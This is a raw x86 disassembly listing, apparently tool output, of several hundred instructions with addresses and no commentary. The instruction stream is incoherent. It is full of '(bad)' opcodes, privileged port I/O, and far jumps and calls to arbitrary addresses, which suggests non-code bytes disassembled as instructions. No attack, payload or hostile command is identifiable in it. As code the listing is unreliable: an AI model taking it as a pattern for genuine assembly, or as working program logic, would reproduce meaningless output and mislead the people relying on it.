  426ae0:	stos   BYTE PTR es:[edi],al
  426ae1:	cmp    al,0x3f
  426ae3:	mov    dl,0xf0
  426ae5:	pop    es
  426ae6:	outs   dx,DWORD PTR ds:[esi]
  426ae7:	mov    WORD PTR [ebx+0x11],ds
  426aea:	jmp    0x6da9:0xa6a4e986
  426af1:	xchg   ebp,eax
  426af2:	test   eax,0xe72915dc
  426af7:	retf   0x798
  426afa:	sbb    al,0xd8
  426afc:	mov    ebx,0xef33fdb8
  426b01:	(bad)  
  426b02:	daa    
  426b03:	fbstp  TBYTE PTR [edi-0x15]
  426b06:	fyl2xp1 
  426b08:	out    0xd9,eax
  426b0a:	pop    esi
  426b0b:	push   edx
  426b0c:	add    eax,0xf9e77000
  426b11:	fstp   TBYTE PTR [esi+0x5c]
  426b14:	xchg   esp,eax
  426b15:	sbb    eax,0x3b25aa4d
  426b1a:	mov    WORD PTR [eax+0x15f040a],cs
  426b20:	and    eax,0x4e54084
  426b25:	mov    al,ds:0xda529454
  426b2a:	popa   
  426b2b:	xor    al,al
  426b2d:	adc    DWORD PTR [edi-0x4f34d230],ebx
  426b33:	pop    ds
  426b34:	jb     0x426bae
  426b36:	sub    bh,bh
  426b38:	scas   eax,DWORD PTR es:[edi]
  426b39:	loopne 0x426ae4
  426b3b:	sar    DWORD PTR [edx-0x347655ae],1
  426b41:	xchg   edi,eax
  426b42:	shr    BYTE PTR ss:[edx+0x46],1
  426b46:	mov    edx,0xa442176f
  426b4b:	neg    DWORD PTR [esi-0x9]
  426b4e:	test   eax,0xeeb1e853
  426b53:	out    0x33,al
  426b55:	push   eax
  426b56:	inc    ebx
  426b57:	fiadd  WORD PTR ds:0x992ea5a2
  426b5d:	push   ebp
  426b5e:	push   ss
  426b5f:	mov    ch,0xc
  426b61:	mov    ebp,0xad97b145
  426b66:	bound  ecx,QWORD PTR [ebx]
  426b68:	pop    esp
  426b69:	loopne 0x426b60
  426b6b:	in     al,dx
  426b6c:	mov    ecx,0x5b46362c
  426b71:	mov    al,ds:0xb6d483a3
  426b76:	xchg   esi,eax
  426b77:	push   ss
  426b78:	sub    al,0x91
  426b7a:	mov    al,0x10
  426b7c:	test   al,0x96
  426b7e:	add    eax,0x1590559
  426b83:	or     eax,0x96d06ab9
  426b88:	mov    eax,0x209f3f55
  426b8d:	adc    BYTE PTR [edx+eax*2],ch
  426b90:	adc    ah,BYTE PTR [ebx+0x20]
  426b93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426b94:	xor    ah,dh
  426b96:	jmp    0x16aba0e6
  426b9b:	call   0x10a97c87
  426ba0:	addr16 sahf 
  426ba2:	arpl   di,bx
  426ba4:	mov    eax,0x1c22ede5
  426ba9:	mov    BYTE PTR ds:0x4d01b47f,bh
  426baf:	popf   
  426bb0:	adc    bh,BYTE PTR [ebx]
  426bb2:	iret   
  426bb3:	in     eax,0x4f
  426bb5:	ret    0xdb76
  426bb8:	icebp  
  426bb9:	scas   eax,DWORD PTR es:[edi]
  426bba:	mov    edi,0x735e71f4
  426bbf:	call   DWORD PTR [edx]
  426bc1:	xchg   ebx,eax
  426bc2:	xlat   BYTE PTR ds:[ebx]
  426bc3:	aas    
  426bc4:	inc    edx
  426bc5:	fcmovne st,st(6)
  426bc7:	push   ecx
  426bc8:	mov    bh,0xd0
  426bca:	pop    ecx
  426bcb:	test   al,0xc7
  426bcd:	sub    BYTE PTR [ebp+0x23c95832],0xd
  426bd4:	xor    esi,DWORD PTR [ebx]
  426bd6:	adc    ch,BYTE PTR [ecx]
  426bd8:	sbb    BYTE PTR [eax-0xf96df8],0xde
  426bdf:	jge    0x426c43
  426be1:	mov    gs,WORD PTR [ebx+edx*1+0x76945cf9]
  426be8:	les    esp,FWORD PTR [ebp+0x2b]
  426beb:	addr16 ja 0x426c33
  426bee:	ds jb  0x426c24
  426bf1:	(bad)  
  426bf2:	and    DWORD PTR [edx+0xd],eax
  426bf5:	fnstcw WORD PTR [ebp+0x2128adf3]
  426bfb:	daa    
  426bfc:	nop
  426bfd:	stos   DWORD PTR es:[edi],eax
  426bfe:	inc    ecx
  426bff:	or     BYTE PTR [ebx-0x4c],0x38
  426c03:	sti    
  426c04:	cli    
  426c05:	and    eax,0xe1ded765
  426c0a:	mov    al,ds:0x3bfe1ce8
  426c0f:	pushf  
  426c10:	das    
  426c11:	imul   DWORD PTR [edi]
  426c13:	adc    BYTE PTR [edx],ch
  426c15:	cmc    
  426c16:	mov    esi,0x13ce1e7d
  426c1b:	(bad)  
  426c1c:	in     eax,dx
  426c1d:	or     bh,BYTE PTR [edi+0x8]
  426c20:	cmp    eax,0xb9214187
  426c25:	adc    ch,BYTE PTR [edi+0x52668aea]
  426c2b:	push   ecx
  426c2c:	aaa    
  426c2d:	lea    esp,[ecx]
  426c2f:	dec    eax
  426c30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426c31:	sub    al,0x8d
  426c33:	fdivrp st(5),st
  426c35:	mov    cl,0x10
  426c37:	cdq    
  426c38:	push   ebp
  426c39:	pop    ebp
  426c3a:	out    dx,eax
  426c3b:	dec    edi
  426c3c:	xlat   BYTE PTR ds:[ebx]
  426c3d:	push   edi
  426c3e:	(bad)  
  426c3f:	(bad)  
  426c40:	fbld   TBYTE PTR [ebx+ebp*2+0x1c]
  426c44:	mov    edx,0x97b6c978
  426c49:	push   esp
  426c4a:	add    DWORD PTR [esp+ebp*2+0x6c],ebp
  426c4e:	call   0xc02e6b82
  426c53:	jb     0x426cb8
  426c55:	popa   
  426c56:	(bad)  
  426c58:	std    
  426c59:	xchg   edx,eax
  426c5a:	pop    edx
  426c5b:	fiadd  DWORD PTR [edi-0x55]
  426c5e:	adc    cl,BYTE PTR [esi+edx*8+0x2baab128]
  426c65:	stos   BYTE PTR es:[edi],al
  426c66:	mov    ebp,edx
  426c68:	inc    esp
  426c69:	out    0x95,eax
  426c6b:	push   ecx
  426c6c:	mov    dl,0x2b
  426c6e:	xor    BYTE PTR [esi-0x49],bh
  426c71:	inc    edi
  426c72:	push   DWORD PTR [ecx+0x13]
  426c75:	jecxz  0x426cf3
  426c77:	test   al,dh
  426c79:	jae    0x426c8f
  426c7b:	sar    BYTE PTR [eax+0x3a],0x99
  426c7f:	fisttp WORD PTR [ebx+edx*1-0x20804af]
  426c86:	arpl   WORD PTR [esi+0x70e65a9d],cx
  426c8c:	mov    dh,0x8f
  426c8e:	xor    al,0x81
  426c90:	adc    al,0x6c
  426c92:	push   0x65
  426c94:	jg     0x426c23
  426c96:	pop    esp
  426c97:	sti    
  426c98:	sahf   
  426c99:	rcr    DWORD PTR [ecx+0x527d1d73],cl
  426c9f:	fisttp DWORD PTR [edi+0x34]
  426ca2:	and    ch,BYTE PTR [edi+0x494474b]
  426ca8:	sbb    eax,0x8855afb6
  426cad:	bound  ebp,QWORD PTR [esi+0x5b4061c4]
  426cb3:	scas   eax,DWORD PTR es:[edi]
  426cb4:	out    dx,al
  426cb5:	cwde   
  426cb6:	ret    0xeae2
  426cb9:	adc    dh,ch
  426cbb:	sub    dl,BYTE PTR [ebx+ecx*8+0x20]
  426cbf:	lea    edx,[edi-0x29]
  426cc2:	in     eax,dx
  426cc3:	push   esi
  426cc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426cc5:	std    
  426cc6:	inc    eax
  426cc7:	jmp    0x7ab3:0x1bc6e522
  426cce:	test   eax,0x451aecad
  426cd3:	js     0x426cff
  426cd5:	call   0x294e46dc
  426cda:	add    eax,0x62e60eb4
  426cdf:	js     0x426c76
  426ce1:	sbb    eax,0xfffe59d2
  426ce6:	or     al,0xe2
  426ce8:	mov    esi,0x2cbefa92
  426ced:	mov    ecx,0x6a22631d
  426cf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426cf3:	aas    
  426cf4:	lods   al,BYTE PTR ds:[esi]
  426cf5:	dec    eax
  426cf6:	mov    bl,0xc0
  426cf8:	ins    BYTE PTR es:[edi],dx
  426cf9:	(bad)  
  426cfa:	icebp  
  426cfb:	jmp    0xb7260c4b
  426d00:	mov    bh,0x5e
  426d02:	div    DWORD PTR [ecx]
  426d04:	into   
  426d05:	jne    0x426cf2
  426d07:	adc    al,0x98
  426d09:	cmp    eax,0x1bcf31a0
  426d0e:	push   ss
  426d0f:	jne    0x426c92
  426d11:	jo     0x426d74
  426d13:	jae    0x426cfa
  426d15:	call   0x42c6:0xc7717dad
  426d1c:	aas    
  426d1d:	jp     0x426d3a
  426d1f:	jecxz  0x426d63
  426d21:	sahf   
  426d22:	loop   0x426cef
  426d24:	retf   
  426d25:	fcom   DWORD PTR [edi-0x59]
  426d28:	mov    esp,0x9fb792a7
  426d2d:	lods   eax,DWORD PTR ds:[esi]
  426d2e:	mov    cl,0x1f
  426d30:	stos   DWORD PTR es:[edi],eax
  426d31:	and    DWORD PTR [ebx+0x5e4b2340],edi
  426d37:	js     0x426cc1
  426d39:	in     al,dx
  426d3a:	push   ds
  426d3b:	call   0x82736260
  426d40:	loop   0x426ce5
  426d42:	jnp    0x426d4e
  426d44:	loop   0x426d2e
  426d46:	and    BYTE PTR [ebx],ch
  426d48:	daa    
  426d49:	cmp    edx,esp
  426d4b:	jb     0x426cdd
  426d4d:	lods   eax,DWORD PTR ds:[esi]
  426d4e:	cmp    eax,0xcd662542
  426d53:	or     DWORD PTR [ebx],0xffffffbf
  426d56:	xor    eax,0x7d99c4f1
  426d5b:	mov    eax,ds:0x890af2aa
  426d60:	pop    ecx
  426d61:	clc    
  426d62:	or     eax,0x6fb95921
  426d67:	int    0x64
  426d69:	rcl    BYTE PTR [eax+0x4f],cl
  426d6c:	imul   ebp,ebx,0xffffff8d
  426d6f:	add    DWORD PTR [esi-0x9c16a14],ebp
  426d75:	outs   dx,BYTE PTR ds:[esi]
  426d76:	mov    ds:0x5eed114c,eax
  426d7b:	fdivr  QWORD PTR [ecx-0x1]
  426d7e:	aaa    
  426d7f:	dec    DWORD PTR [ebx-0x6158011]
  426d85:	and    eax,0x2f6fd6ea
  426d8a:	cmp    DWORD PTR [edx],eax
  426d8c:	add    ah,dh
  426d8e:	aam    0xc9
  426d90:	push   ebx
  426d91:	out    dx,eax
  426d92:	pop    es
  426d93:	fisttp QWORD PTR [ebp+0x29]
  426d96:	stos   BYTE PTR es:[edi],al
  426d97:	inc    esi
  426d98:	cmc    
  426d99:	inc    esi
  426d9a:	adc    ecx,ecx
  426d9c:	mov    ch,0x6a
  426d9e:	scas   al,BYTE PTR es:[edi]
  426d9f:	adc    al,0x34
  426da1:	and    al,0x80
  426da3:	or     BYTE PTR [ecx],ah
  426da5:	pop    ss
  426da6:	jp     0x426d8c
  426da8:	fstp   DWORD PTR [eax-0x1a]
  426dab:	mov    gs,ebp
  426dad:	sub    al,0x40
  426daf:	add    BYTE PTR ds:0x51403fc2,ch
  426db5:	retf   0xc8e4
  426db8:	xchg   ebx,eax
  426db9:	dec    ebp
  426dba:	mov    eax,ds:0x11a39ed4
  426dbf:	xchg   ecx,eax
  426dc0:	mov    ah,dh
  426dc2:	(bad)  
  426dc3:	adc    bl,dl
  426dc5:	fwait
  426dc6:	inc    esi
  426dc7:	dec    edi
  426dc8:	adc    edi,DWORD PTR [edi-0x33c5fdbc]
  426dce:	mov    ds:0xdd7bafe7,al
  426dd3:	mov    esp,0x39d05bfd
  426dd8:	call   0x1539ae1e
  426ddd:	pop    edx
  426dde:	mov    WORD PTR [esp+ebp*8],ds
  426de1:	aad    0xac
  426de3:	std    
  426de4:	sbb    al,0x27
  426de6:	or     BYTE PTR [ecx+0x2d56871c],dh
  426dec:	sbb    eax,0x12250456
  426df1:	stos   DWORD PTR es:[edi],eax
  426df2:	mov    BYTE PTR [esi+0x5a],cl
  426df5:	jmp    0x118a:0x39a52c5a
  426dfc:	mov    DWORD PTR [ebx-0x30],esi
  426dff:	sbb    eax,edx
  426e01:	push   es
  426e02:	push   0xa6f7de1d
  426e07:	cmp    al,0xd2
  426e09:	popa   
  426e0a:	cs in  eax,0x5
  426e0d:	mov    edx,0x18ec3ca
  426e12:	push   ecx
  426e13:	jmp    0x426e33
  426e15:	and    esi,DWORD PTR [ebp+0x64be6d40]
  426e1b:	cmp    cl,BYTE PTR [esp+esi*8+0x33]
  426e1f:	imul   esi,DWORD PTR [eax+edx*4],0xb
  426e23:	and    BYTE PTR [edx-0x21],0xd3
  426e27:	mov    bh,0x73
  426e29:	adc    bh,BYTE PTR ds:0x89451134
  426e2f:	pop    ebp
  426e30:	and    al,0xb6
  426e32:	xchg   esi,eax
  426e33:	fidivr DWORD PTR [ebx-0x1b]
  426e36:	fimul  DWORD PTR ds:0x71b7744e
  426e3c:	adc    al,0x4a
  426e3e:	fild   WORD PTR [ecx+edi*8]
  426e41:	(bad)  
  426e42:	int    0x30
  426e44:	repnz cwde 
  426e46:	mov    ebx,0x4470f85
  426e4b:	aas    
  426e4c:	pop    ebx
  426e4d:	cld    
  426e4e:	sub    al,0x41
  426e50:	aaa    
  426e51:	or     DWORD PTR [ebp-0x3fbd6f72],edi
  426e57:	mov    al,ds:0x16930bba
  426e5c:	loope  0x426e05
  426e5e:	pop    eax
  426e5f:	fld    QWORD PTR [ecx]
  426e61:	outs   dx,BYTE PTR ds:[esi]
  426e62:	push   ebx
  426e63:	into   
  426e64:	stos   DWORD PTR es:[edi],eax
  426e65:	test   DWORD PTR [esi],ebp
  426e67:	repnz fmul QWORD PTR [edi+0x1b9bba9c]
  426e6e:	imul   edx,DWORD PTR [esi],0xffffff86
  426e71:	aas    
  426e72:	or     esi,DWORD PTR [ebp+0x4502902f]
  426e78:	jno    0x426ec3
  426e7a:	xor    BYTE PTR [eax+0x7861aaef],bh
  426e80:	out    dx,al
  426e81:	in     al,dx
  426e82:	jbe    0x426e9a
  426e84:	aam    0x82
  426e86:	and    DWORD PTR [edx+0x4769ac4a],ebx
  426e8c:	in     eax,0xd6
  426e8e:	fmul   st(3),st
  426e90:	fcmovb st,st(1)
  426e92:	sub    bh,dl
  426e94:	stos   BYTE PTR es:[edi],al
  426e95:	fisubr DWORD PTR [edx+0x3d]
  426e98:	stos   BYTE PTR es:[edi],al
  426e99:	pop    edx
  426e9a:	sub    al,0x17
  426e9c:	int3   
  426e9d:	adc    DWORD PTR [esi+ecx*4+0x72],eax
  426ea1:	push   ebp
  426ea2:	xchg   ebx,eax
  426ea3:	mov    bh,BYTE PTR [edx+0x5a]
  426ea6:	ror    DWORD PTR [edx+ebp*2+0x73],cl
  426eaa:	jmp    0xefe5456b
  426eaf:	ins    DWORD PTR es:[edi],dx
  426eb0:	ins    DWORD PTR es:[edi],dx
  426eb1:	or     BYTE PTR [ebp+0x7d],al
  426eb4:	cmp    eax,0xe97f7ac0
  426eb9:	in     al,dx
  426eba:	icebp  
  426ebb:	pshufw mm6,QWORD PTR [ebx+ecx*8],0xe2
  426ec0:	and    eax,0x5725edd
  426ec5:	mov    al,0xb1
  426ec7:	mov    cl,0xa1
  426ec9:	pop    ds
  426eca:	call   DWORD PTR [ebp-0x4b454211]
  426ed0:	xor    cl,bh
  426ed2:	jnp    0x426ef5
  426ed4:	mov    eax,ds:0xf68d0bb9
  426ed9:	sahf   
  426eda:	cli    
  426edb:	mov    BYTE PTR [eax+0x23],al
  426ede:	dec    eax
  426edf:	push   ebx
  426ee0:	pop    ecx
  426ee1:	es popf 
  426ee3:	mov    ds:0x3d1bd2ea,eax
  426ee8:	or     esi,DWORD PTR [eax+0x46]
  426eeb:	jle    0x426e7f
  426eed:	mov    DWORD PTR [esi],esp
  426eef:	pushf  
  426ef0:	and    al,0xcc
  426ef2:	lahf   
  426ef3:	daa    
  426ef4:	retf   0x2581
  426ef7:	lds    esi,FWORD PTR [ebp+0x34]
  426efa:	icebp  
  426efb:	jl     0x426eef
  426efd:	push   es
  426efe:	sbb    dl,BYTE PTR [esi-0x5bcc01e2]
  426f04:	addr16 imul ecx,esi,0x77
  426f08:	not    DWORD PTR [edx-0x9]
  426f0b:	retf   
  426f0c:	inc    esi
  426f0d:	inc    esi
  426f0e:	dec    esi
  426f0f:	xor    DWORD PTR [eax+0x68206dd],ecx
  426f15:	and    ebp,DWORD PTR [edx+ebp*4-0x36]
  426f19:	push   0x12
  426f1b:	xor    dl,BYTE PTR [edi]
  426f1d:	shl    DWORD PTR [edi],1
  426f1f:	push   ebx
  426f20:	or     BYTE PTR [ebx],dh
  426f22:	inc    ebp
  426f23:	mov    ebp,db1
  426f26:	push   edx
  426f27:	inc    ecx
  426f28:	or     BYTE PTR [edx],bh
  426f2a:	div    DWORD PTR [edx+0x8a584db]
  426f30:	daa    
  426f31:	cmp    al,0x57
  426f33:	ds js  0x426f67
  426f36:	dec    esp
  426f37:	mov    ds:0xf389cf9f,al
  426f3c:	or     dh,0xa6
  426f3f:	xor    BYTE PTR [ebx-0x78],ch
  426f42:	sti    
  426f43:	add    ebp,ebx
  426f45:	add    edi,DWORD PTR ds:0x16de768c
  426f4b:	sar    BYTE PTR [esi-0x786c096e],cl
  426f51:	sbb    al,0xbd
  426f53:	mov    edx,0xfcfcc5b0
  426f58:	mov    ecx,0xfcfee690
  426f5d:	or     bl,dl
  426f5f:	jp     0x426eec
  426f61:	mov    dl,0x4e
  426f63:	or     eax,0x7522693d
  426f68:	sbb    eax,0x2b2ea42
  426f6e:	push   edx
  426f6f:	aam    0x5b
  426f71:	jle    0x426fb8
  426f73:	push   ebp
  426f74:	push   edx
  426f75:	sbb    ecx,DWORD PTR [ecx+0x31]
  426f78:	shl    BYTE PTR [edi+0x2d],cl
  426f7b:	std    
  426f7c:	popa   
  426f7d:	inc    esp
  426f7e:	cmp    esp,DWORD PTR [ebp-0x59922d03]
  426f84:	jl     0x426ff7
  426f86:	xor    BYTE PTR ds:0xa7c8f90b,0x7
  426f8d:	pop    esp
  426f8e:	scas   al,BYTE PTR es:[edi]
  426f8f:	inc    esi
  426f90:	xor    BYTE PTR [edi-0x17b9167c],bh
  426f96:	test   eax,0x849bfc40
  426f9b:	pop    esi
  426f9c:	mov    ah,0xb8
  426f9e:	adc    BYTE PTR ds:0x1452264c,ah
  426fa4:	(bad)  
  426fa5:	push   eax
  426fa6:	adc    al,0xe4
  426fa8:	dec    edx
  426fa9:	add    eax,0xe60b5718
  426fae:	scas   al,BYTE PTR es:[edi]
  426faf:	cmp    al,0x1
  426fb1:	dec    esp
  426fb3:	fst    QWORD PTR [ebp-0x57145dff]
  426fb9:	inc    esi
  426fba:	and    bh,bl
  426fbc:	daa    
  426fbd:	push   esi
  426fbe:	ja     0x426fd2
  426fc0:	int3   
  426fc1:	das    
  426fc2:	das    
  426fc3:	and    BYTE PTR [edx],ch
  426fc5:	xchg   ecx,edi
  426fc7:	sbb    al,0x29
  426fc9:	test   BYTE PTR [ecx+0x5f733814],dh
  426fcf:	xchg   esp,eax
  426fd0:	dec    edi
  426fd1:	push   ebp
  426fd2:	sbb    DWORD PTR [ebx+0x60a94b5f],ebp
  426fd8:	and    eax,0xbc665408
  426fdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426fde:	into   
  426fdf:	int3   
  426fe0:	jg     0x42700a
  426fe2:	jl     0x427024
  426fe4:	lock les esi,FWORD PTR [ebp-0x5955fab0]
  426feb:	mov    eax,ds:0x53d4d49e
  426ff0:	das    
  426ff1:	or     edi,esi
  426ff3:	sub    DWORD PTR [edx],ebp
  426ff5:	or     edi,ebp
  426ff7:	leave  
  426ff8:	loopne 0x42700b
  426ffa:	adc    DWORD PTR [ebp+edi*8-0xb806273],eax
  427001:	scas   al,BYTE PTR es:[edi]
  427002:	jmp    edi
  427004:	jnp    0x426fa5
  427006:	clc    
  427007:	test   DWORD PTR [ecx-0x2],0x7dfede5
  42700e:	add    al,BYTE PTR [eax]
  427010:	shr    BYTE PTR [edi-0x6],1
  427013:	inc    ebx
  427014:	scas   eax,DWORD PTR es:[edi]
  427015:	jp     0x427016
  427017:	je     0x427033
  427019:	jbe    0x426fc5
  42701b:	xor    dl,cl
  42701d:	clc    
  42701e:	push   eax
  42701f:	sub    al,0x24
  427021:	pop    eax
  427022:	(bad)  [edx-0x57]
  427025:	push   ebp
  427026:	pop    ebp
  427027:	and    ecx,DWORD PTR [ebp-0x5cef33c9]
  42702d:	out    dx,al
  42702e:	mov    dl,BYTE PTR [ecx]
  427030:	retf   0x3dd6
  427033:	daa    
  427034:	pusha  
  427035:	in     al,0xe4
  427037:	cmova  eax,DWORD PTR [edx]
  42703a:	and    eax,0xc47c5c36
  42703f:	xor    al,0xca
  427041:	popa   
  427042:	mov    bh,0xe3
  427044:	inc    ebp
  427045:	loopne 0x42701b
  427047:	mov    ecx,0xa22e2435
  42704c:	lahf   
  42704d:	clc    
  42704e:	push   ebx
  42704f:	in     al,dx
  427050:	cmp    al,0x14
  427052:	cmp    DWORD PTR [ebp-0x38d4e48c],edi
  427058:	xchg   edi,eax
  427059:	cwde   
  42705a:	lods   al,BYTE PTR ds:[esi]
  42705b:	xor    al,0x34
  42705d:	popa   
  42705e:	add    DWORD PTR ds:0x59a96059,0xc8ba6964
  427068:	bnd je 0x427004
  42706b:	lds    eax,FWORD PTR [ebp-0x365695fb]
  427071:	aad    0x73
  427073:	call   0x1ae2:0xde8dab05
  42707a:	mov    ah,0xf0
  42707c:	or     eax,0x3a481a18
  427081:	cmp    BYTE PTR [edi-0x5ca0bd43],bl
  427087:	inc    esp
  427088:	push   edx
  427089:	sbb    ebx,DWORD PTR [ecx-0x24b63011]
  42708f:	sub    BYTE PTR [esi+0x55],0xe8
  427093:	pop    esi
  427094:	inc    edx
  427095:	setb   BYTE PTR [ebp-0x5b9e64e6]
  42709c:	arpl   WORD PTR [ebx-0x73301df4],bx
  4270a2:	and    BYTE PTR [edx],al
  4270a4:	stos   DWORD PTR es:[edi],eax
  4270a5:	sub    al,0x4c
  4270a7:	mov    bl,0x64
  4270a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4270aa:	lds    eax,FWORD PTR [edi]
  4270ac:	mov    al,ds:0x6938ac73
  4270b1:	outs   dx,BYTE PTR ds:[esi]
  4270b2:	fist   WORD PTR [ebp+0x52e6a1de]
  4270b8:	mov    al,ds:0xee85889a
  4270bd:	jp     0x427046
  4270bf:	xchg   ebp,eax
  4270c0:	leave  
  4270c1:	out    dx,eax
  4270c2:	scas   eax,DWORD PTR es:[edi]
  4270c3:	push   edi
  4270c4:	je     0x42712c
  4270c6:	ins    BYTE PTR es:[edi],dx
  4270c7:	mov    ds:0x91671076,al
  4270cc:	xor    al,0x8f
  4270ce:	fdiv   st(1),st
  4270d0:	fdiv   DWORD PTR [edi+0x44e1f172]
  4270d6:	xor    ebp,DWORD PTR [ecx+0x76b09509]
  4270dc:	jbe    0x427067
  4270de:	adc    esp,DWORD PTR [edi+0x16]
  4270e1:	pop    ecx
  4270e2:	pop    ecx
  4270e3:	imul   ecx,eax,0xffffff82
  4270e6:	ins    BYTE PTR es:[edi],dx
  4270e7:	adc    BYTE PTR [ebx+0x1918e92d],0x50
  4270ee:	adc    al,0xf5
  4270f0:	xchg   ecx,eax
  4270f1:	lahf   
  4270f2:	int3   
  4270f3:	mov    ecx,0x86c17714
  4270f8:	arpl   WORD PTR [ebx+eiz*1-0x47cf3bfa],bp
  4270ff:	adc    al,0x5
  427101:	jle    0x4270be
  427103:	sbb    esi,DWORD PTR [eax]
  427105:	es pop ecx
  427107:	jno    0x4270a8
  427109:	cli    
  42710a:	data16 and dh,cl
  42710d:	enter  0x1579,0x4a
  427111:	push   ebp
  427112:	popa   
  427113:	(bad)  
  427114:	jle    0x4270d4
  427116:	(bad)  
  427117:	loop   0x4270c8
  427119:	retf   
  42711a:	sbb    BYTE PTR [esi],0x3c
  42711d:	cmp    ah,BYTE PTR [eax+edi*4-0x7e6e1f75]
  427124:	loopne 0x42710d
  427126:	or     dh,bh
  427128:	and    edi,DWORD PTR [esi+0x7bb8edc8]
  42712e:	jne    0x427158
  427130:	in     al,0x42
  427132:	inc    esi
  427133:	add    eax,0x838b7e78
  427138:	mov    dl,bl
  42713a:	cli    
  42713b:	cld    
  42713c:	xlat   BYTE PTR ds:[ebx]
  42713d:	ror    DWORD PTR [edx+0x534342c9],cl
  427143:	xlat   BYTE PTR ds:[ebx]
  427144:	and    eax,0x66135517
  427149:	std    
  42714a:	cmp    ecx,ebx
  42714c:	or     al,0x55
  42714e:	adc    DWORD PTR [ecx+ebx*8+0x5e],edx
  427152:	mov    esi,0xfcfdfd63
  427157:	jnp    0x42710d
  427159:	inc    BYTE PTR [eax]
  42715b:	aad    0xf7
  42715d:	jg     0x42715e
  42715f:	idiv   DWORD PTR [edi-0x2426e81c]
  427165:	fninit 
  427167:	mov    ebx,0xb437c4fe
  42716c:	aas    
  42716d:	std    
  42716e:	jae    0x42710f
  427170:	imul   edi,DWORD PTR [ebx-0x6cb20087],0x49
  427177:	sub    eax,0x104d6375
  42717c:	call   0xda5b:0x4daea2ba
  427183:	nop
  427184:	jmp    0xcd47:0xbbdec7ff
  42718b:	xchg   esi,eax
  42718c:	push   ebp
  42718d:	cmc    
  42718e:	mov    eax,ds:0x5ad739bf
  427193:	jnp    0x4271ec
  427195:	aad    0xf7
  427197:	cmp    BYTE PTR [edi+0x4dd39c7e],ch
  42719d:	inc    ebx
  42719e:	ror    DWORD PTR [edx],cl
  4271a0:	or     BYTE PTR [eax-0x28dbbefa],bl
  4271a6:	loopne 0x4271ab
  4271a8:	outs   dx,DWORD PTR ds:[esi]
  4271a9:	and    dl,BYTE PTR [edx+0x448933e0]
  4271af:	xor    esi,DWORD PTR [edx-0x51]
  4271b2:	jecxz  0x427142
  4271b4:	and    al,0x9a
  4271b6:	xchg   ecx,eax
  4271b7:	sbb    ecx,ebp
  4271b9:	lock (bad) 
  4271bb:	cmp    esp,edx
  4271bd:	mov    bl,ah
  4271bf:	pop    esi
  4271c0:	xchg   ebx,eax
  4271c1:	cmp    ah,dl
  4271c3:	sub    BYTE PTR [ecx],bl
  4271c5:	and    ebx,DWORD PTR [edx]
  4271c7:	das    
  4271c8:	mov    esi,0xf056d042
  4271cd:	add    BYTE PTR [eax-0x4bddfae9],0x11
  4271d4:	xchg   esp,eax
  4271d5:	rol    BYTE PTR [eax-0x18],0x16
  4271d9:	ins    BYTE PTR es:[edi],dx
  4271da:	call   0x738f:0xd0d07e86
  4271e1:	into   
  4271e2:	ja     0x4271c2
  4271e4:	out    0x7b,eax
  4271e6:	push   esi
  4271e7:	aad    0xde
  4271e9:	imul   ebp,DWORD PTR [ebp+0x7398ff79],0xffffffed
  4271f0:	mov    ebp,0x4efaeabf
  4271f5:	and    edx,eax
  4271f7:	cvtps2pd xmm6,xmm6
  4271fa:	sbb    ch,dh
  4271fc:	push   ebp
  4271fd:	jge    0x427254
  4271ff:	mov    ebx,0xbded5576
  427204:	out    0xeb,al
  427206:	aaa    
  427207:	out    0xfc,eax
  427209:	dec    ebp
  42720a:	cmp    BYTE PTR [ecx],dl
  42720c:	nop
  42720d:	cmp    BYTE PTR [eax],bh
  42720f:	jae    0x4271d8
  427211:	fsubr  st,st(6)
  427213:	or     DWORD PTR [esi+ebx*8-0x1b],esp
  427217:	xor    BYTE PTR [eax-0x6d],cl
  42721a:	sar    edi,0xb6
  42721d:	push   ds
  42721e:	mov    ebx,0x35e25705
  427223:	shl    BYTE PTR [ecx],0xa1
  427226:	popf   
  427227:	daa    
  427228:	lods   al,BYTE PTR ds:[esi]
  427229:	lods   eax,DWORD PTR ds:[esi]
  42722a:	(bad)  
  42722b:	xor    DWORD PTR [edx+0x4534c42a],ebp
  427231:	cli    
  427232:	stos   BYTE PTR es:[edi],al
  427233:	dec    edi
  427234:	sub    BYTE PTR [edi-0x28],0xc3
  427238:	mov    eax,ds:0x72523195
  42723d:	or     BYTE PTR [edx],dh
  42723f:	ret    0xc648
  427242:	or     BYTE PTR [ecx+eiz*1+0x70],dl
  427246:	xor    bh,0x15
  427249:	pop    eax
  42724a:	sbb    BYTE PTR [eax+eiz*1-0x29379d7f],ch
  427251:	icebp  
  427252:	push   es
  427253:	push   0xb47dd84c
  427258:	shl    BYTE PTR [esi],0x1f
  42725b:	(bad)  
  42725d:	pop    ss
  42725e:	adc    BYTE PTR [eax-0x30],0xa9
  427262:	pop    ecx
  427263:	and    eax,0x2120f147
  427268:	clc    
  427269:	mov    dh,0x42
  42726b:	retf   0x4211
  42726e:	dec    ecx
  42726f:	dec    ebx
  427270:	mov    WORD PTR [ebx+0x29e81ba0],?
  427276:	sar    BYTE PTR [eax-0x33e264a1],1
  42727c:	adc    BYTE PTR [edx+0x3e452385],0x44
  427283:	pop    ss
  427284:	pop    ds
  427285:	inc    ebx
  427286:	shr    DWORD PTR [esi],0xf
  427289:	clc    
  42728a:	xchg   ecx,eax
  42728b:	jbe    0x427226
  42728d:	jmp    0xfe74ed02
  427292:	(bad)  
  427293:	repnz sbb eax,0xe73932d4
  427299:	nop
  42729a:	bound  eax,QWORD PTR [esi+0x6a]
  42729d:	xor    cl,BYTE PTR [esi-0x9475c46]
  4272a3:	shr    DWORD PTR [edi-0x3d],0xde
  4272a7:	in     eax,0xab
  4272a9:	ror    ah,1
  4272ab:	sbb    cl,ah
  4272ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4272ae:	jae    0x42727c
  4272b0:	mul    BYTE PTR [esi-0x38]
  4272b3:	cmp    DWORD PTR [ebx],esp
  4272b5:	push   esp
  4272b6:	add    ebx,esp
  4272b8:	mov    cl,0x43
  4272ba:	mov    bl,BYTE PTR [ebp-0x264059f1]
  4272c0:	into   
  4272c1:	out    0xbe,eax
  4272c3:	pop    eax
  4272c4:	jp     0x42731e
  4272c6:	or     cl,BYTE PTR [ebx]
